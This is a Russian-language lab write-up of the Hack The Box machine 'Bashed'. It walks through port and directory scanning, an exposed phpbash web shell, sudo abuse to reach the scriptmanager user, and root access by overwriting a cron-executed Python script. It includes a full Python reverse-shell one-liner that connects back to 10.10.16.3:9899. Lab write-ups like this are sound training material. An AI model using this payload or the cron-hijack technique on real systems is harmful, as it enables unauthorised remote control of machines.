# Bashed (Linux, Easy)

<figure><img src="../../../../.gitbook/assets/Pasted image 20240902122737.png" alt=""><figcaption></figcaption></figure>

## Сводка

***

При сканировании `Nmap` выделяется только `80` `HTTP`-порт. С помощью фаззинга веб-сервера можно обнаружить консоль, написанную на языке программирования `PHP`. Первоначальное повышение привилегий реализуется через мисконфиг прав пользователей (`sudo -l`), а получение прав суперпользователя через небезопасную задачу `Cron`.

## Разведка

***

Запустим `Nmap`, чтобы просканировать открытые порты на удалённом хосте:

```shell
nmap -sC -sV -oN nmap.out 10.10.10.68
```

```shell
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Результат сканирования показал, что открыт только 80 `HTTP`-порт, с которым можно взаимодействовать через веб-браузер:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902110218.png" alt=""><figcaption></figcaption></figure>



[На данной странице](http://10.10.10.68/single.html) есть пост 4 декабря 2017 года с повествованием о таком инструменте, как `phpbash`:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902110745.png" alt=""><figcaption></figcaption></figure>



На скриншоте указан следующий путь к `php`-скрипту - `/uploads/phpbash.php`:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902110801 (1).png" alt=""><figcaption></figcaption></figure>



Можно предположить, что такой же скрипт может лежать по аналогичному пути на удалённом хосте:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902110819.png" alt=""><figcaption></figcaption></figure>



Теория провалилась, следовательно, нужно копать дальше. Запустим фаззинг с помощью инструмента [Gobuster](https://github.com/OJ/gobuster) и словаря из [SecLists](https://github.com/danielmiessler/SecLists):

```shell
gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.68/ -x php

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 290]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/config.php           (Status: 200) [Size: 0]
```

Из результата фаззинга можно найти интересный каталог `/dev`:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902111056.png" alt=""><figcaption></figcaption></figure>



В нём и лежал `php`-скрипт позволяющий выполнять любые действия с помощью консольных команд на удалённой системе от лица пользователя веб-сервера `www-data`:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902111115.png" alt=""><figcaption></figcaption></figure>



## Первоначальный доступ

***

Работать в веб-интерфейсе не удобно, поэтому сделаем терминальный шелл. С этим делом может помочь [revshells.com](https://www.revshells.com/), где нужно указать только `IP`-адрес и порт, а сервис уже сам подготовит полезную нагрузку:

<figure><img src="../../../../.gitbook/assets/Pasted image 20240902111732.png" alt=""><figcaption></figcaption></figure>

Пэйлоад с `Nc` (`Netcat`) не сработал, поэтому используем `Python`, так как на удалённом хосте есть интерпретатор этого языка программирования. Полезную нагрузку следует ввести в веб-терминал, который располагается по следующему пути `/dev/phpbash.php`. Получаем шелл после того, как поставим листенер с помощью `Rlwrap`, тулзы, которая обеспечит стабильность в работе, и `Netcat`:

<figure><img src="../../../../.gitbook/assets/Pasted image 20240903102842.png" alt=""><figcaption></figcaption></figure>

## Повышение привилегий до прав пользователя

***

После получения удалённого доступа `www-data`, нужно проверить есть ли возможность у пользователя веб-сервера запускать какие-либо команды от лица других пользователей:

```shell
sudo -l
```

<figure><img src="../../../../.gitbook/assets/Pasted image 20240902112148.png" alt=""><figcaption></figcaption></figure>

Абсолютно любую команду без ввода пароля можно запустить от лица пользователя `scriptmanager`:

```shell
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Повысим привилегии через `sudo`:

```shell
sudo -u scriptmanager bash
```

<figure><img src="../../../../.gitbook/assets/Pasted image 20240902112220.png" alt=""><figcaption></figcaption></figure>

## Повышение привилегий до прав суперпользователя

***

В корне файловой системы можно обнаружить каталог `scripts`, к которому имеет доступ пользователь `scriptmanager`:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902112325.png" alt=""><figcaption></figcaption></figure>



В нём присутствует `Python`-скрипт, который записывает в файл `test.txt` строку `"testing 123!"`:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902112545.png" alt=""><figcaption></figcaption></figure>



Можно заметить, что каждую минуту файл `test.txt` обновляется:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902112450 (1).png" alt=""><figcaption></figcaption></figure>



Сам файл `test.txt` имеет владельца и группу пользователей `root`. Это наводит на мысль о том, что в системе работает `Cron`, который каждую минуту запускает `test.py` с правами суперпользователя. Важно отметить, что пользователь `scriptmanager` может вносить изменения в скрипт. Таким образом, можно повысить свои привилегии, внедрив вредоносный `Python`-код. Воспользуемся ещё раз сервисом [revshells](https://www.revshells.com/), изменив порт, например, на `9899`:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902113037.png" alt=""><figcaption></figcaption></figure>



Поставим листенер с помощью `Rlwrap` и `Netcat`, затем перезапишем файл `test.py`:

```shell
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",9899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > test.py
```



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902113058.png" alt=""><figcaption></figcaption></figure>



Получим шелл от лица суперпользователя:



<figure><img src="../../../../.gitbook/assets/Pasted image 20240902113132.png" alt=""><figcaption></figcaption></figure>

